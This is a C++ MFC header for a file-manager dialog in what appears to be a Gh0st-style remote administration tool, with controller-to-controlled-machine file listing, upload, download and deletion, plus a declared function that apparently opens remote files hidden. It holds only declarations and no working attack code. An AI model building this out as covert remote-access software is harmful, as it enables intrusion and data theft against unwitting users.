#pragma once

#include "IOCPServer.h"
#include "TrueColorToolBar.h"

// CFileManagerDlg 对话框


typedef CList<CString, CString&> strList;

class CFileManagerDlg : public CDialog
{
	DECLARE_DYNAMIC(CFileManagerDlg)

public:
	CFileManagerDlg(CWnd* pParent = NULL, CIOCPServer* pIOCPServer = NULL, ClientContext *pContext = NULL);   // 标准构造函数
	virtual ~CFileManagerDlg();
	
	//该类的接受数据的响应
	void CFileManagerDlg::OnReceiveComplete();

	//主控端的跟新驱动器列表
	void CFileManagerDlg::FixedLocalDriveList();
	//被控端的跟新驱动器列表
	void CFileManagerDlg::FixedRemoteDriveList();

// 对话框数据
	enum { IDD = IDD_FILE };

protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV 支持

	DECLARE_MESSAGE_MAP()
public:
	CListCtrl* m_pDragList;		//从哪个控件拖
	CListCtrl* m_pDropList;		//放到哪个控件
	BOOL		m_bDragging;	//正在实施该动作
	int			m_nDragIndex;	//拖控件的第几项
	int			m_nDropIndex;	//放到第几项
	CWnd*		m_pDropWnd;		//放到哪个对话框的句柄
	HCURSOR m_hCursor;          //拖拉过程的鼠标样式




	CListCtrl m_list_local;
	CListCtrl m_list_remote;
	CComboBox m_Local_Directory_ComboBox;
	CComboBox m_Remote_Directory_ComboBox;
	HICON m_hIcon;
	CImageList* m_pImageList_Large;
	CImageList* m_pImageList_Small;

	strList m_Remote_Delete_Job;      //远程删除任务列表
	strList m_Remote_Upload_Job;      //远程传输任务列表从主控端到被控端
	strList m_Remote_Download_Job;    //远程传输任务列表从被控端到主控端
	
	CString m_hCopyDestFolder;
	CString m_strOperatingFile;       // 文件名
	CString m_strUploadRemoteFile;    
	CString m_strReceiveLocalFile;
	ClientContext* m_pContext;
	CIOCPServer* m_iocpServer;
	CString m_IPAddress;
	BYTE m_bRemoteDriveList[1024];    //保存被控端的驱动器列表
	int m_nTransferMode;
	__int64 m_nOperatingFileLength;   // 文件总大小
	__int64	m_nCounter;               // 计数器
	bool m_bIsUpload; 
	bool m_bIsStop;
	CString m_Local_Path;
	CString m_Remote_Path;
	CTrueColorToolBar m_wndToolBar_Local;                     //两个工具栏
	CTrueColorToolBar m_wndToolBar_Remote;
	CStatusBar m_wndStatusBar;                                // 带进度条的状态栏
	CProgressCtrl* m_ProgressCtrl;
	
	virtual BOOL OnInitDialog();
	afx_msg void OnClose();
	
	//在ListLocal控件上的双击消息
	afx_msg void OnDblclkListLocal(NMHDR *pNMHDR, LRESULT *pResult);
	//在ListRemote控件上的双击消息
	afx_msg void OnDblclkListRemote(NMHDR *pNMHDR, LRESULT *pResult);
	//主控端的文件列表
	void CFileManagerDlg::FixedLocalFileList(CString directory = "");
	//被控端的文件列表
	void CFileManagerDlg::FixedRemoteFileList(BYTE *pbBuffer, DWORD dwBufferLen);
	CString CFileManagerDlg::GetParentDirectory(CString strPath);
	afx_msg void OnLocalBigicon();
	afx_msg void OnLocalSmallicon();
	afx_msg void OnLocalList();
	afx_msg void OnLocalReport();
	afx_msg void OnRemoteBigicon();
	afx_msg void OnRemoteSmallicon();
	afx_msg void OnRemoteList();
	afx_msg void OnRemoteReport();
	
	void GetRemoteFileList(CString directory = "");   

	


	void CFileManagerDlg::SendException();
	afx_msg void OnIdtLocalPrev();
	afx_msg void OnIdtRemotePrev();
	afx_msg void OnIdtLocalNewfolder();
	bool CFileManagerDlg::MakeSureDirectoryPathExists(LPCTSTR pszDirPath);
	afx_msg void OnRename();
	afx_msg void OnNMRClickListLocal(NMHDR *pNMHDR, LRESULT *pResult);
	afx_msg void OnLvnEndlabeleditListLocal(NMHDR *pNMHDR, LRESULT *pResult);
	afx_msg void OnDelete();
	afx_msg void OnIdtLocalDelete();
	bool CFileManagerDlg::DeleteDirectory(LPCTSTR lpszDirectory);
	void CFileManagerDlg::EnableControl(BOOL bEnable);
	afx_msg void OnLvnEndlabeleditListRemote(NMHDR *pNMHDR, LRESULT *pResult);
	afx_msg void OnNMRClickListRemote(NMHDR *pNMHDR, LRESULT *pResult);
	afx_msg void OnIdtRemoteDelete();
	BOOL CFileManagerDlg::SendDeleteJob();
	void CFileManagerDlg::EndRemoteDeleteFile();
	afx_msg void OnIdtRemoteNewfolder();
	afx_msg void OnNewfolder();
	afx_msg void OnRefresh();
	afx_msg void OnIdtLocalCopy();
	//从主控端传输文件到被控端如果是文件就插入到任务列表如果是文件夹就递归
	bool CFileManagerDlg::FixedUploadDirectory(LPCTSTR lpPathName);
	////从主控端到被控端的发送任务
	BOOL CFileManagerDlg::SendUploadJob();
	
	void CFileManagerDlg::SendFileData();
	void CFileManagerDlg::ShowProgress();
	//如果有任务继续发送没有就恢复界面
	void CFileManagerDlg::EndLocalUploadFile();
	afx_msg void OnIdtRemoteCopy();
	BOOL CFileManagerDlg::SendDownloadJob();
	void CFileManagerDlg::EndLocalRecvFile();
	void CFileManagerDlg::CreateLocalRecvFile();
	void CFileManagerDlg::SendStop();
	void CFileManagerDlg::WriteLocalRecvFile();

	//主控端发送的文件在被控端存在
	void CFileManagerDlg::SendTransferMode();
	afx_msg void OnTransfer();
	afx_msg void OnLocalOpen();
	afx_msg void OnRemoteOpenShow();
	afx_msg void OnRemoteOpenHide();
	afx_msg void OnLvnBegindragListLocal(NMHDR *pNMHDR, LRESULT *pResult);
	afx_msg void OnLvnBegindragListRemote(NMHDR *pNMHDR, LRESULT *pResult);
	afx_msg void OnMouseMove(UINT nFlags, CPoint point);
	afx_msg void OnLButtonUp(UINT nFlags, CPoint point);
	void CFileManagerDlg::DropItemOnList(CListCtrl* pDragList, CListCtrl* pDropList);
	afx_msg void OnIdtLocalStop();
	afx_msg void OnIdtRemoteStop();
	afx_msg void OnUpdateIdtLocalStop(CCmdUI *pCmdUI);
	afx_msg void OnUpdateIdtLocalPrev(CCmdUI *pCmdUI);
	afx_msg void OnCbnSelchangeRemotePath();
};

int	GetIconIndex(LPCTSTR lpFileName, DWORD dwFileAttributes);
